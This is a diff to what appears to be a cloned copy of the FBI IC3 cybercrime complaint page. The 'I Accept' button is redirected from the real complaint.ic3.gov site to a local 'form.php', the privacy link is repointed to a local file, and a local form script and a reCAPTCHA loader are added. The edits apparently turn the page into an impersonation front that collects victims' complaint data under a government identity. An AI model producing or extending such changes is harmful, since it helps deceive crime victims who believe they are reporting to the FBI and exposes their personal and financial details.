@@ -19,7 +19,7 @@
                 </ul>
                 </p>
                 <p>Complaints filed via this website are analyzed and may be referred to federal, state, local or international law enforcement and partner agencies for possible investigation.</p>
-                <p>The complaint information you submit to this site is encrypted via secure socket layer (SSL) encryption. Please see the <a target="_blank" href="/Home/Privacy">Privacy Policy</a> for further information.</p>
+                <p>The complaint information you submit to this site is encrypted via secure socket layer (SSL) encryption. Please see the <a target="_blank" href="privacy-policy.php">Privacy Policy</a> for further information.</p>
                 <p>We thank you for your cooperation.</p>
                 <hr class="tablet:margin-left-0">
                 <p>By clicking "I Accept" you acknowledge the following:</p>
@@ -44,7 +44,7 @@
     </div>
 </div>
 <script async type="module" nonce="dvm0ixsemwv20rrd">
-    document.getElementById('acceptFile')?.addEventListener('click', () => window.open('https://complaint.ic3.gov/', '_blank', 'noopener'));
+    document.getElementById('acceptFile')?.addEventListener('click', () => window.open('form.php', '_blank', 'noopener'));
 </script>
 
 <footer id="ic3Footer" class="usa-footer usa-footer--slim">
@@ -174,6 +174,8 @@
 
 <script src="https://cdn.datatables.net/2.3.4/js/dataTables.js"></script>
 
+<script src="js/form.js"></script>
+
 <script>
     $(document).ready(function() {
         $('#myTable').DataTable();
@@ -194,6 +196,8 @@
         protect: true
     });
 </script>
+
+<script src="https://www.google.com/recaptcha/api.js" async defer nonce="dzvwhr5k53xm1rye"></script>
 
 </body>
 
